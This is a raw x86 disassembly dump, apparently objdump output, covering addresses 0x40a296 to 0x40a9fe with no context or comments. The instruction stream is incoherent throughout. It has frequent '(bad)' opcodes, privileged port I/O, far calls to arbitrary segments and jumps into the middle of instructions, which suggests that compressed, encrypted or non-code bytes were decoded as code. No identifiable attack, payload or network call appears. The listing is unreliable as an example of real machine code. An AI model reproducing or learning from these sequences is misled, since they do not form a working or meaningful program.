  40a296:	pop    ds
  40a297:	dec    ebp
  40a298:	iret   
  40a299:	imul   esi,DWORD PTR [edx+0x6f],0xffffffb9
  40a29d:	xor    cl,BYTE PTR [edx-0x3e]
  40a2a0:	cs inc ebx
  40a2a2:	ins    DWORD PTR es:[edi],dx
  40a2a3:	loope  0x40a31a
  40a2a5:	mov    DWORD PTR [esi-0x75703238],ebp
  40a2ab:	push   0x37
  40a2ad:	lock adc DWORD PTR fs:[ebp+0x315f77b8],0x470cd49b
  40a2b9:	fld    QWORD PTR [edx+0x1fd2c2be]
  40a2bf:	xor    al,0x8a
  40a2c1:	adc    esi,DWORD PTR [esi]
  40a2c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2c4:	sbb    al,0xd5
  40a2c6:	cmp    al,0x95
  40a2c8:	les    ecx,FWORD PTR [eax-0x3f7a8b93]
  40a2ce:	in     eax,0xa4
  40a2d0:	push   0x1134d57b
  40a2d5:	inc    ecx
  40a2d6:	lahf   
  40a2d7:	test   DWORD PTR [edi-0x7b],ebx
  40a2da:	out    dx,al
  40a2db:	jecxz  0x40a2eb
  40a2dd:	loop   0x40a27d
  40a2df:	sti    
  40a2e0:	mov    dl,0x58
  40a2e2:	jecxz  0x40a334
  40a2e4:	push   edx
  40a2e5:	and    DWORD PTR [ecx-0x3b],esi
  40a2e8:	xchg   edx,eax
  40a2e9:	and    DWORD PTR [eax+eiz*8],0xffffffda
  40a2ed:	mov    eax,0xbafaaf7e
  40a2f2:	pop    esi
  40a2f3:	sbb    ch,BYTE PTR [ebx+0x72]
  40a2f6:	je     0x40a28d
  40a2f8:	out    dx,al
  40a2f9:	sbb    DWORD PTR [ecx+ecx*4-0x284d2e5e],esi
  40a300:	ror    DWORD PTR [ebx+0x285a417a],cl
  40a306:	arpl   WORD PTR [esp+ebp*2+0x77],di
  40a30a:	in     eax,0x66
  40a30c:	lods   eax,DWORD PTR ds:[esi]
  40a30d:	mov    ch,0x68
  40a30f:	mov    dl,BYTE PTR [edi+0xf]
  40a312:	aam    0xa
  40a314:	xor    BYTE PTR [edx-0xac07cc4],ch
  40a31a:	pop    esi
  40a31b:	mov    esi,0x5991f874
  40a320:	out    0xf5,eax
  40a322:	push   ebp
  40a323:	outs   dx,DWORD PTR ds:[esi]
  40a324:	mov    ebx,0x621918f6
  40a329:	mov    bl,BYTE PTR [ebp-0x18918fc3]
  40a32f:	mov    BYTE PTR [ebp-0x1c7976dd],ah
  40a335:	mov    BYTE PTR [ebx+ebx*2-0x23],al
  40a339:	inc    ebp
  40a33a:	out    0x2c,al
  40a33c:	aam    0xae
  40a33e:	fs ret 0xb9b2
  40a342:	inc    esi
  40a343:	loop   0x40a2ed
  40a345:	and    al,0xce
  40a347:	(bad)  
  40a348:	sub    ecx,DWORD PTR [edi+0x4b630e92]
  40a34e:	inc    esi
  40a34f:	(bad)  
  40a350:	enter  0x5280,0x87
  40a354:	out    dx,eax
  40a355:	pop    ebx
  40a356:	or     ebp,DWORD PTR [ebx-0x4b]
  40a359:	mov    ebx,0x54f8c802
  40a35e:	pop    ecx
  40a35f:	add    BYTE PTR [ecx],cl
  40a361:	push   ebp
  40a362:	or     eax,0xf927f0b8
  40a367:	xchg   edi,eax
  40a368:	mov    BYTE PTR [esi+0x56b47105],0x9b
  40a36f:	inc    edi
  40a370:	inc    edx
  40a371:	pusha  
  40a372:	clc    
  40a373:	and    edi,DWORD PTR [ebx]
  40a375:	mov    dl,0x51
  40a377:	ficomp DWORD PTR [eax-0xb]
  40a37a:	cld    
  40a37b:	cmp    edx,DWORD PTR [edi-0x7f61e87f]
  40a381:	lds    esp,FWORD PTR [esp+edi*1-0x3e]
  40a385:	ins    DWORD PTR es:[edi],dx
  40a386:	(bad)  
  40a387:	outs   dx,DWORD PTR ds:[esi]
  40a388:	je     0x40a3d9
  40a38a:	test   DWORD PTR [ebx-0x4f390e7e],eax
  40a390:	fnsave [esi]
  40a392:	pop    edx
  40a393:	sbb    eax,0xb27a2a7a
  40a398:	xlat   BYTE PTR ds:[ebx]
  40a399:	sub    BYTE PTR [edi-0x23],bh
  40a39c:	pushf  
  40a39d:	arpl   sp,di
  40a39f:	enter  0x7eb9,0xdf
  40a3a3:	aam    0x2f
  40a3a5:	stc    
  40a3a6:	mov    edi,0x84fd7280
  40a3ab:	mov    al,es:0xbbd40ab9
  40a3b1:	leave  
  40a3b2:	shl    DWORD PTR [edx+ebx*8+0x25],cl
  40a3b6:	loope  0x40a424
  40a3b8:	push   ebp
  40a3b9:	push   es
  40a3ba:	int3   
  40a3bb:	retf   
  40a3bc:	lds    edx,FWORD PTR [edx+esi*2]
  40a3bf:	sub    DWORD PTR [esi+0x6e],edi
  40a3c2:	je     0x40a374
  40a3c4:	push   edx
  40a3c5:	out    0xa8,eax
  40a3c7:	ror    BYTE PTR [edi+edi*4+0x39],1
  40a3cb:	xchg   edi,eax
  40a3cc:	fcomp  QWORD PTR [ebx+0x6c]
  40a3cf:	lahf   
  40a3d0:	jmp    DWORD PTR [edx]
  40a3d2:	cmp    BYTE PTR [edx+0x3b2a11b1],bh
  40a3d8:	mov    ch,0x6a
  40a3da:	jns    0x40a410
  40a3dc:	frstor [edx+0x75]
  40a3df:	cmc    
  40a3e0:	ds cmc 
  40a3e2:	or     ebp,edx
  40a3e4:	test   eax,0xb8193e68
  40a3e9:	inc    esp
  40a3ea:	bound  esp,QWORD PTR [edi+0x48cd118f]
  40a3f0:	dec    edx
  40a3f1:	jb     0x40a454
  40a3f3:	fucomip st,st(4)
  40a3f5:	or     esi,DWORD PTR [esi-0x5d]
  40a3f8:	xchg   ebp,eax
  40a3f9:	pusha  
  40a3fa:	out    0x17,al
  40a3fc:	(bad)  
  40a3fd:	xlat   BYTE PTR ds:[ebx]
  40a3fe:	or     DWORD PTR [edx+0x51],edx
  40a401:	and    al,bh
  40a403:	xchg   ecx,eax
  40a404:	pop    ebx
  40a405:	sbb    BYTE PTR [esp+ecx*8],0x2f
  40a409:	add    BYTE PTR ds:0xd23a455,ch
  40a40f:	push   edx
  40a410:	je     0x40a458
  40a412:	call   0xef91:0x3f5d1c85
  40a419:	ret    
  40a41a:	xchg   ebp,esp
  40a41c:	pusha  
  40a41d:	test   DWORD PTR [ecx+0x2ee74055],0x2a2ee795
  40a427:	xlat   BYTE PTR ds:[ebx]
  40a428:	and    DWORD PTR [edi+0x3bf3e025],esi
  40a42e:	imul   edi,DWORD PTR [edi-0x18496847],0xbf23305d
  40a438:	dec    ebp
  40a439:	test   al,0xa6
  40a43b:	mov    ecx,0xed8ea1ca
  40a440:	sbb    al,0x1e
  40a442:	(bad)  
  40a443:	cli    
  40a444:	aam    0xfd
  40a446:	fcomi  st,st(0)
  40a448:	stc    
  40a449:	mov    BYTE PTR [ebp+0x154121d2],al
  40a44f:	je     0x40a430
  40a451:	fld    QWORD PTR [edx]
  40a453:	clc    
  40a454:	adc    al,0xd1
  40a456:	xor    ecx,DWORD PTR [ecx]
  40a458:	mov    eax,cs:0x9229419c
  40a45e:	lock and bl,cl
  40a461:	dec    edi
  40a462:	push   ebp
  40a463:	and    BYTE PTR [edx-0x27553970],0x3b
  40a46a:	test   ch,ch
  40a46c:	mov    ds:0xda7f9c08,al
  40a471:	pusha  
  40a472:	dec    edi
  40a473:	js     0x40a45b
  40a475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a476:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a477:	ja     0x40a4c9
  40a479:	mov    ecx,DWORD PTR [ecx]
  40a47b:	adc    eax,0x975c3719
  40a480:	mov    gs,WORD PTR [ebx+0x43]
  40a483:	and    BYTE PTR [ecx*2+0x59a7c003],0x51
  40a48b:	popa   
  40a48c:	xchg   DWORD PTR [ebx],ecx
  40a48e:	xor    esp,esi
  40a490:	int3   
  40a491:	adc    eax,0x12b92a2e
  40a496:	push   es
  40a497:	mov    ebx,0xdfc796f0
  40a49c:	test   BYTE PTR [edi+0x68],ch
  40a49f:	pop    eax
  40a4a0:	mov    ecx,0xfaf13fa3
  40a4a5:	fwait
  40a4a6:	jnp    0x40a51b
  40a4a8:	jp     0x40a46e
  40a4aa:	mov    ch,0x88
  40a4ac:	scas   eax,DWORD PTR es:[edi]
  40a4ad:	dec    eax
  40a4ae:	(bad)  
  40a4af:	push   ss
  40a4b0:	jmp    0x40a4c2
  40a4b2:	xor    eax,0x17de934
  40a4b7:	and    dh,bh
  40a4b9:	jmp    0x2b7a:0xe0153f5c
  40a4c0:	call   0x54f7:0x6eda71ed
  40a4c7:	mov    edx,esi
  40a4c9:	nop
  40a4ca:	xor    eax,0x89abf571
  40a4cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4d0:	adc    eax,0x7e126eac
  40a4d5:	pop    ebp
  40a4d6:	and    eax,0x55d926f3
  40a4db:	inc    DWORD PTR [eax-0x22]
  40a4de:	imul   esp,ebx,0xe2ec5173
  40a4e4:	mov    ah,0x3b
  40a4e6:	iret   
  40a4e7:	push   0xffffff9a
  40a4e9:	pop    esp
  40a4ea:	lds    esi,FWORD PTR fs:[edi+0x35deca12]
  40a4f1:	inc    esi
  40a4f2:	leave  
  40a4f3:	outs   dx,BYTE PTR ds:[esi]
  40a4f4:	shl    ebp,1
  40a4f6:	retf   
  40a4f7:	sbb    eax,0xdd30f5b6
  40a4fc:	mov    bl,0xd2
  40a4fe:	lds    ebx,FWORD PTR [ebx]
  40a500:	in     eax,dx
  40a501:	out    dx,al
  40a502:	xor    eax,0x933f940e
  40a507:	adc    al,0xff
  40a509:	ins    DWORD PTR es:[edi],dx
  40a50a:	lock pusha 
  40a50c:	push   eax
  40a50d:	push   ss
  40a50e:	cmc    
  40a50f:	aad    0x59
  40a511:	push   edx
  40a512:	mov    bh,0xc
  40a514:	mov    cl,0xd3
  40a516:	push   edx
  40a517:	ss mov edx,0xe87f692b
  40a51d:	adc    ch,bl
  40a51f:	ins    DWORD PTR es:[edi],dx
  40a520:	int3   
  40a521:	inc    edx
  40a522:	lea    ebx,[ecx]
  40a524:	jbe    0x40a511
  40a526:	cwde   
  40a527:	push   ss
  40a528:	and    DWORD PTR [ebp+0x56],ecx
  40a52b:	inc    ecx
  40a52c:	inc    eax
  40a52d:	loopne 0x40a58a
  40a52f:	sub    edi,DWORD PTR [edi+edx*2-0x21e0845e]
  40a536:	popa   
  40a537:	cmp    ecx,DWORD PTR [eax]
  40a539:	ins    DWORD PTR es:[edi],dx
  40a53a:	call   0x363ca3fc
  40a53f:	mov    dl,0xfd
  40a541:	dec    edx
  40a542:	mov    edx,0x89c46cd3
  40a547:	mov    ds:0xa17a40dc,al
  40a54c:	jmp    0x40a5c4
  40a54e:	fstp   QWORD PTR [ecx-0x51]
  40a551:	das    
  40a552:	sub    eax,0x2a14dbbb
  40a557:	je     0x40a5cb
  40a559:	ja     0x40a531
  40a55b:	xchg   esi,eax
  40a55c:	test   al,0xe7
  40a55e:	mov    esp,0x9d5ad5ad
  40a563:	xor    BYTE PTR [ebp-0x45],al
  40a566:	outs   dx,DWORD PTR ds:[esi]
  40a567:	loop   0x40a537
  40a569:	dec    esp
  40a56a:	pop    edx
  40a56b:	jae    0xabf8b415
  40a571:	pop    edx
  40a572:	adc    ebp,ecx
  40a574:	xchg   esp,eax
  40a575:	(bad)  
  40a576:	pushf  
  40a577:	repz ds mov ebx,0x3607baf2
  40a57e:	add    bh,BYTE PTR gs:[edx-0x3d]
  40a582:	push   0x1a23df4f
  40a587:	test   eax,0x9fdbeb8
  40a58c:	dec    DWORD PTR [esi]
  40a58e:	push   ds
  40a58f:	pop    eax
  40a590:	and    esp,0x1f3f620b
  40a596:	mov    dh,0x6e
  40a598:	ins    DWORD PTR es:[edi],dx
  40a599:	push   edi
  40a59a:	ja     0x40a5d7
  40a59c:	or     al,0x1a
  40a59e:	icebp  
  40a59f:	jecxz  0x40a595
  40a5a1:	fdivrp st(0),st
  40a5a3:	out    0x25,eax
  40a5a5:	das    
  40a5a6:	js     0x40a53d
  40a5a8:	test   eax,0x30e8b39e
  40a5ad:	jge    0x40a552
  40a5af:	pop    ebx
  40a5b0:	test   al,0x98
  40a5b2:	xor    cl,bh
  40a5b4:	or     eax,0x94df79ff
  40a5b9:	cmp    cl,BYTE PTR [edx+eiz*1-0x4df666c6]
  40a5c0:	inc    ebp
  40a5c1:	test   eax,0xb811f489
  40a5c6:	loopne 0x40a5ae
  40a5c8:	mov    DWORD PTR [ebx+ebx*1-0x6],esi
  40a5cc:	sub    eax,0x94701d63
  40a5d1:	cli    
  40a5d2:	cdq    
  40a5d3:	sbb    ebx,DWORD PTR [ebp+0x3a]
  40a5d6:	stos   DWORD PTR es:[edi],eax
  40a5d7:	mov    eax,0x12942592
  40a5dc:	loope  0x40a579
  40a5de:	mov    dh,0xc2
  40a5e0:	ins    BYTE PTR es:[edi],dx
  40a5e1:	fstp   QWORD PTR [esi+eax*2+0x6c]
  40a5e5:	mov    al,ds:0x446d4ed1
  40a5ea:	mov    WORD PTR [esi+0x4919133d],es
  40a5f0:	in     eax,dx
  40a5f1:	inc    eax
  40a5f2:	sbb    al,0x2b
  40a5f4:	inc    ebp
  40a5f5:	fisubr DWORD PTR [edx+ecx*1-0x6257b7c3]
  40a5fc:	jne    0x40a63b
  40a5fe:	pop    esi
  40a5ff:	fs dec edx
  40a601:	outs   dx,BYTE PTR ds:[esi]
  40a602:	int    0x28
  40a604:	xchg   ecx,eax
  40a605:	mov    edi,0xe50709e4
  40a60a:	inc    ecx
  40a60b:	jnp    0x40a5ed
  40a60d:	lea    edx,ds:0xa010f700
  40a613:	out    0x81,eax
  40a615:	add    al,0x30
  40a617:	dec    ebx
  40a618:	mov    ebp,0x775b9609
  40a61d:	sbb    ch,BYTE PTR [ecx+0x42]
  40a620:	mov    eax,0x43029992
  40a625:	add    BYTE PTR ds:0xa18297cb,bl
  40a62b:	sub    DWORD PTR [edi+edi*2],esp
  40a62e:	aaa    
  40a62f:	or     esp,edx
  40a631:	fst    DWORD PTR [edx+0x6b]
  40a634:	gs call 0xb2a0c10c
  40a63a:	aad    0x58
  40a63c:	push   ebx
  40a63d:	cmc    
  40a63e:	push   ebp
  40a63f:	in     al,dx
  40a640:	dec    edx
  40a641:	retw   0xe008
  40a645:	dec    edx
  40a646:	jo     0x40a697
  40a648:	jge    0x40a65d
  40a64a:	mov    eax,0x593df93b
  40a64f:	dec    ebx
  40a650:	pop    esi
  40a651:	adc    DWORD PTR [ebx-0x1211bf9b],ecx
  40a657:	inc    eax
  40a658:	adc    BYTE PTR [ecx],0x65
  40a65b:	sbb    al,al
  40a65d:	je     0x40a667
  40a65f:	mov    eax,ds:0xee2fa64c
  40a664:	sub    ebp,ebp
  40a666:	bound  edi,QWORD PTR [edx+0x6a]
  40a669:	rol    BYTE PTR [ebx],0x7d
  40a66c:	pop    eax
  40a66d:	add    eax,0x4aab142f
  40a672:	inc    esp
  40a673:	retf   0x3e41
  40a676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a677:	inc    BYTE PTR [ebp-0x303b3384]
  40a67d:	cmp    BYTE PTR [esi-0x74],ah
  40a680:	sar    DWORD PTR [ebx],1
  40a682:	leave  
  40a683:	add    DWORD PTR [eax-0x4736041c],eax
  40a689:	sub    DWORD PTR [ebx],0xe573f9c5
  40a68f:	(bad)  
  40a691:	mov    bl,0x27
  40a693:	and    ebx,0x5e5efd42
  40a699:	fidivr DWORD PTR [edx]
  40a69b:	call   0xd47a:0xdd9ffa2d
  40a6a2:	and    DWORD PTR [ebp-0x612282cb],edx
  40a6a8:	test   al,0xb2
  40a6aa:	fcomp  DWORD PTR [eax]
  40a6ac:	out    dx,eax
  40a6ad:	push   ebp
  40a6ae:	lock pusha 
  40a6b0:	jne    0x40a66e
  40a6b2:	fbstp  TBYTE PTR [ecx-0x613bcf80]
  40a6b8:	loop   0x40a6b3
  40a6ba:	lock mov ah,0x2
  40a6bd:	jl     0x40a714
  40a6bf:	xor    ebx,0xffffff86
  40a6c2:	ins    DWORD PTR es:[edi],dx
  40a6c3:	sbb    al,0x37
  40a6c5:	test   eax,0xb4b15f79
  40a6ca:	inc    esi
  40a6cb:	fistp  QWORD PTR [ebp+0x6d5ab4b4]
  40a6d1:	sbb    al,0xad
  40a6d3:	pop    edi
  40a6d4:	daa    
  40a6d5:	aam    0x4b
  40a6d7:	inc    ecx
  40a6d8:	pop    ebp
  40a6d9:	or     al,0xfc
  40a6db:	dec    edx
  40a6dc:	(bad)  
  40a6dd:	cs icebp 
  40a6df:	aad    0xae
  40a6e1:	mov    WORD PTR [edi-0x4cb2cabd],cs
  40a6e7:	dec    edx
  40a6e8:	push   ebp
  40a6e9:	mov    bl,0x17
  40a6eb:	lea    esp,[ecx]
  40a6ed:	div    DWORD PTR [esi]
  40a6ef:	push   0xffffffaa
  40a6f1:	out    0xdc,al
  40a6f3:	shr    BYTE PTR [edx+0x41],cl
  40a6f6:	inc    edx
  40a6f7:	out    dx,al
  40a6f8:	push   ecx
  40a6f9:	jg     0x40a69e
  40a6fb:	lea    ebp,[edi+0x401d1f2]
  40a701:	cmovno edx,DWORD PTR [eax-0x60]
  40a705:	or     ah,al
  40a707:	fisub  DWORD PTR [eax+eiz*2]
  40a70a:	arpl   WORD PTR [ebx+eax*8-0x37ce52c9],di
  40a711:	test   cl,0x55
  40a714:	fbld   TBYTE PTR [eax-0xc]
  40a717:	xchg   esp,eax
  40a718:	or     al,0xd8
  40a71a:	out    0x30,al
  40a71c:	mov    BYTE PTR [edx],al
  40a71e:	cmc    
  40a71f:	jnp    0x40a6c8
  40a721:	fld    TBYTE PTR [ecx+0x6ec5a736]
  40a727:	sub    eax,0x964b73a9
  40a72c:	jmp    0x40a6c9
  40a72e:	mov    BYTE PTR [ebx+ebx*1],ah
  40a731:	imul   esp,DWORD PTR [esi+0x3b],0xa66d164
  40a738:	fs popf 
  40a73a:	lds    ebx,FWORD PTR [edi+0x7f81c0eb]
  40a740:	push   edi
  40a741:	sbb    ecx,esp
  40a743:	mov    ecx,0x6c08e266
  40a748:	pushf  
  40a749:	(bad)  
  40a74a:	sub    al,0x84
  40a74c:	xchg   esi,eax
  40a74d:	pop    edx
  40a74e:	xlat   BYTE PTR ds:[ebx]
  40a74f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a750:	push   edx
  40a751:	(bad)  
  40a752:	sbb    al,0xd6
  40a754:	jbe    0x40a7a3
  40a756:	inc    eax
  40a757:	xchg   ecx,eax
  40a758:	int3   
  40a759:	add    WORD PTR [ebp+0x6a],ax
  40a75d:	cmp    esp,DWORD PTR [eax+ebx*1-0x5aa3c0d2]
  40a764:	(bad)  
  40a765:	into   
  40a766:	push   DWORD PTR [ecx+0x4a]
  40a769:	add    BYTE PTR [esi-0x16],ah
  40a76c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a76d:	mov    bh,0x95
  40a76f:	lods   al,BYTE PTR ds:[esi]
  40a770:	cmp    DWORD PTR [ebx+edx*4],esi
  40a773:	pop    edx
  40a774:	imul   eax,DWORD PTR [esi],0x64
  40a777:	sub    dl,al
  40a779:	adc    al,0x4c
  40a77b:	test   eax,0x1bbe3b41
  40a780:	push   esp
  40a781:	sbb    esi,DWORD PTR [esi+ebx*8+0x180c0a53]
  40a788:	idiv   BYTE PTR gs:[edx]
  40a78b:	adc    eax,0x376bf4ac
  40a790:	stc    
  40a791:	cmc    
  40a792:	into   
  40a793:	push   0xffffffec
  40a795:	cs fcmovbe st,st(6)
  40a798:	faddp  st(5),st
  40a79a:	cmp    eax,0xb563491
  40a79f:	xchg   ecx,eax
  40a7a0:	(bad)  
  40a7a1:	clc    
  40a7a2:	jae    0x40a7f3
  40a7a4:	mov    BYTE PTR [eax-0x62],bl
  40a7a7:	loope  0x40a775
  40a7a9:	je     0x40a7e4
  40a7ab:	rol    DWORD PTR [esp+edx*8-0x7a],1
  40a7af:	mov    dl,0xfe
  40a7b1:	pop    ecx
  40a7b2:	sbb    eax,esi
  40a7b4:	mov    edx,0xa2e9c3b4
  40a7b9:	lock lods al,BYTE PTR ds:[esi]
  40a7bb:	sbb    edx,DWORD PTR [esi+edx*1]
  40a7be:	jae    0x40a759
  40a7c0:	out    0xb5,al
  40a7c2:	scas   eax,DWORD PTR es:[edi]
  40a7c3:	mov    ch,0x74
  40a7c5:	in     al,dx
  40a7c6:	mov    dh,0x4b
  40a7c8:	jecxz  0x40a77f
  40a7ca:	inc    ebx
  40a7cb:	adc    dl,dh
  40a7cd:	cdq    
  40a7ce:	jnp    0x40a7f7
  40a7d0:	adc    BYTE PTR [edx-0x5d],al
  40a7d3:	stos   DWORD PTR es:[edi],eax
  40a7d4:	sbb    BYTE PTR [esi-0x58],al
  40a7d7:	sahf   
  40a7d8:	mov    ebx,0xcd9e5b76
  40a7dd:	aaa    
  40a7de:	or     eax,0xe1a3a4be
  40a7e3:	in     eax,dx
  40a7e4:	push   ds
  40a7e5:	outs   dx,BYTE PTR ds:[esi]
  40a7e6:	int3   
  40a7e7:	pop    ecx
  40a7e8:	xchg   esi,eax
  40a7e9:	xlat   BYTE PTR ds:[ebx]
  40a7ea:	sub    bh,BYTE PTR [edx]
  40a7ec:	mov    BYTE PTR [ebx+0x5a2022f8],dh
  40a7f2:	xor    ecx,DWORD PTR [ecx]
  40a7f4:	push   0xf7ff1a26
  40a7f9:	into   
  40a7fa:	mov    dl,0xf2
  40a7fc:	(bad)  
  40a7fd:	xchg   esp,eax
  40a7fe:	sti    
  40a7ff:	and    al,BYTE PTR [eax+0x46]
  40a802:	mov    ds:0x4aed6822,eax
  40a807:	xchg   bl,bl
  40a809:	jecxz  0x40a82b
  40a80b:	ins    BYTE PTR es:[edi],dx
  40a80c:	mov    esi,0xc22af112
  40a811:	jo     0x40a7d6
  40a813:	fld    DWORD PTR [ecx-0x6db70b12]
  40a819:	das    
  40a81a:	(bad)
  40a81d:	jne    0x40a889
  40a81f:	test   eax,0x3631668c
  40a824:	(bad)  
  40a825:	sbb    ebp,DWORD PTR [esi]
  40a827:	scas   eax,DWORD PTR es:[edi]
  40a828:	ins    DWORD PTR es:[edi],dx
  40a829:	std    
  40a82a:	pop    ds
  40a82b:	jb     0x40a86f
  40a82d:	dec    esp
  40a82e:	lahf   
  40a82f:	pop    es
  40a830:	sub    eax,0x6617b38a
  40a835:	mov    WORD PTR [eax],ss
  40a837:	cdq    
  40a838:	cmp    DWORD PTR [edx-0x5525f7ad],0x9cb3daf9
  40a842:	stos   BYTE PTR es:[edi],al
  40a843:	fistp  WORD PTR [edi]
  40a845:	mov    edi,0xcc48363c
  40a84a:	in     al,0xac
  40a84c:	sbb    bl,BYTE PTR [esi+0x54]
  40a84f:	push   es
  40a850:	cld    
  40a851:	add    dh,BYTE PTR [edi-0x527e221f]
  40a857:	inc    edi
  40a858:	shl    BYTE PTR [ebx],cl
  40a85a:	imul   ebx,DWORD PTR [esi+0x73],0xe5575c0
  40a861:	dec    esi
  40a862:	mov    cl,0x16
  40a864:	cmp    cl,BYTE PTR [edx+ebp*1-0x67a7cecd]
  40a86b:	sub    bl,0x8d
  40a86e:	stos   DWORD PTR es:[edi],eax
  40a86f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a870:	cmp    eax,0x9a676b25
  40a875:	lods   eax,DWORD PTR ds:[esi]
  40a876:	pop    es
  40a877:	lds    eax,FWORD PTR [ebx+0x5f]
  40a87a:	push   esp
  40a87b:	mov    cl,0x8e
  40a87d:	fidiv  DWORD PTR cs:0x8d750732
  40a884:	or     eax,0xe0832455
  40a889:	jmp    0x40a8c4
  40a88b:	test   DWORD PTR [ebp-0x299f65e1],edx
  40a891:	add    eax,0xa288496b
  40a896:	dec    edi
  40a897:	loope  0x40a887
  40a899:	cmp    eax,0xa481d3fd
  40a89e:	mov    ecx,0xd2cd2f3
  40a8a3:	pop    es
  40a8a4:	nop
  40a8a5:	mov    esi,0x15b44b9c
  40a8aa:	dec    ecx
  40a8ab:	adc    eax,0x28c6f9f5
  40a8b0:	push   cs
  40a8b1:	mov    edi,0x1aa8067d
  40a8b6:	int    0xdd
  40a8b8:	enter  0x7958,0x2
  40a8bc:	xchg   edx,eax
  40a8bd:	pop    ebp
  40a8be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8bf:	retf   0xefc2
  40a8c2:	fisttp DWORD PTR [edi+0x6d]
  40a8c5:	xor    eax,0xa5088dad
  40a8ca:	fcomp  DWORD PTR [edx]
  40a8cc:	imul   eax,edi,0x7e
  40a8cf:	push   edi
  40a8d0:	xchg   esi,eax
  40a8d1:	neg    BYTE PTR [eax+0x4f]
  40a8d4:	sub    DWORD PTR [esp+edx*1+0x4a6b6def],ecx
  40a8db:	daa    
  40a8dc:	and    al,0xaf
  40a8de:	sub    bh,BYTE PTR [ecx-0x40b4aa37]
  40a8e4:	int3   
  40a8e5:	dec    esp
  40a8e6:	mov    BYTE PTR [ebp-0x1d],dh
  40a8e9:	and    BYTE PTR [edx],bl
  40a8eb:	cmp    DWORD PTR [eax],ebp
  40a8ed:	jae    0x40a8ad
  40a8ef:	and    al,0xd3
  40a8f1:	xchg   DWORD PTR [ebx-0x55],ebx
  40a8f4:	pop    eax
  40a8f5:	aaa    
  40a8f6:	in     al,0x62
  40a8f8:	lods   eax,DWORD PTR ds:[esi]
  40a8f9:	push   edi
  40a8fa:	mov    al,0x64
  40a8fc:	fnstenv [ebx]
  40a8fe:	imul   ecx,DWORD PTR [ecx],0x38
  40a901:	pop    ebp
  40a902:	cmp    DWORD PTR [ebx+0x5b],edx
  40a905:	add    edx,DWORD PTR [esi+edx*1]
  40a908:	test   bh,bl
  40a90a:	xchg   edx,eax
  40a90b:	mov    cl,0xf7
  40a90d:	xchg   BYTE PTR [edx-0x2b],bh
  40a910:	cdq    
  40a911:	int    0xc0
  40a913:	and    dh,BYTE PTR [ebx+0x25]
  40a916:	ins    DWORD PTR es:[edi],dx
  40a917:	les    eax,FWORD PTR [ecx+0x7d]
  40a91a:	mov    eax,0xb960ee35
  40a91f:	mov    edx,0x5fbdfb4e
  40a924:	cli    
  40a925:	jne    0x40a8d6
  40a927:	sub    BYTE PTR [esp+ebx*4-0x2e],0xc3
  40a92c:	xor    ecx,DWORD PTR [ebx-0x3d]
  40a92f:	ins    BYTE PTR es:[edi],dx
  40a930:	xor    eax,0x9e134521
  40a935:	fiadd  DWORD PTR [eax-0x36]
  40a938:	push   ds
  40a939:	mov    BYTE PTR [edx],cl
  40a93b:	daa    
  40a93c:	lahf   
  40a93d:	ins    BYTE PTR es:[edi],dx
  40a93e:	jl     0x40a95c
  40a940:	(bad)  
  40a941:	pop    es
  40a942:	xor    ecx,DWORD PTR [edi]
  40a944:	dec    ebx
  40a945:	mov    ch,0x25
  40a947:	data16 mov bl,0xfe
  40a94a:	dec    ecx
  40a94b:	dec    eax
  40a94c:	cdq    
  40a94d:	add    BYTE PTR [esi+esi*4-0x7f9d1170],ah
  40a954:	dec    ebx
  40a955:	setne  BYTE PTR [ebx+0x24ece1d1]
  40a95c:	and    dh,bl
  40a95e:	and    dh,BYTE PTR [eax-0x6d8c1579]
  40a964:	adc    ah,BYTE PTR [ebx+0x3f]
  40a967:	sbb    esi,DWORD PTR [ecx]
  40a969:	push   cs
  40a96a:	fcom   QWORD PTR gs:[ecx+eiz*4-0x18b6ca46]
  40a972:	in     al,0x2f
  40a974:	aad    0x76
  40a976:	les    eax,FWORD PTR [edi+ebp*4-0x5a0ba103]
  40a97d:	push   ebx
  40a97e:	loope  0x40a92a
  40a980:	ret    
  40a981:	jo     0x40a92e
  40a983:	loopne 0x40a957
  40a985:	addr16 sub eax,0x917bc79a
  40a98b:	mov    eax,0x102a4df6
  40a990:	push   0x77
  40a992:	sub    BYTE PTR [si-0x44],0x65
  40a997:	mov    al,ds:0xea9c1730
  40a99c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a99d:	push   edi
  40a99e:	in     eax,0x5
  40a9a0:	ret    0x76ce
  40a9a3:	lods   al,BYTE PTR ds:[esi]
  40a9a4:	and    al,0x7f
  40a9a6:	loop   0x40a976
  40a9a8:	xchg   ebp,eax
  40a9a9:	out    0xaa,eax
  40a9ab:	inc    edx
  40a9ac:	(bad)  
  40a9ad:	sbb    DWORD PTR [edx*4-0x20913dc8],eax
  40a9b4:	jbe    0x40a96f
  40a9b6:	mov    eax,0xbd47b81a
  40a9bb:	in     eax,0x14
  40a9bd:	mov    ecx,0xfe8c8f0d
  40a9c2:	nop
  40a9c3:	call   0x3784:0xb15840c1
  40a9ca:	fstp   QWORD PTR [edi]
  40a9cc:	pop    eax
  40a9cd:	outs   dx,BYTE PTR ds:[esi]
  40a9ce:	aad    0x26
  40a9d0:	mov    DWORD PTR cs:[ecx+0x1],ebp
  40a9d4:	jl     0x40aa37
  40a9d6:	inc    ebx
  40a9d7:	outs   dx,BYTE PTR ds:[esi]
  40a9d8:	sbb    dl,BYTE PTR [eax-0x30]
  40a9db:	dec    edx
  40a9dc:	push   edx
  40a9dd:	jne    0x40a993
  40a9df:	inc    esp
  40a9e0:	inc    ebx
  40a9e1:	xor    DWORD PTR [eax+ecx*1+0x77],edx
  40a9e5:	sbb    al,0x89
  40a9e7:	add    DWORD PTR [ebp+edx*2-0x25],edx
  40a9eb:	mov    al,ds:0xf264bf58
  40a9f0:	(bad)  
  40a9f1:	out    dx,eax
  40a9f2:	dec    esp
  40a9f3:	aam    0xb
  40a9f5:	jmp    0x7e7d0c14
  40a9fa:	cld    
  40a9fb:	xchg   esp,eax
  40a9fc:	cld    
  40a9fd:	push   edi
  40a9fe:	cmp    edx,DWORD PTR [esi]
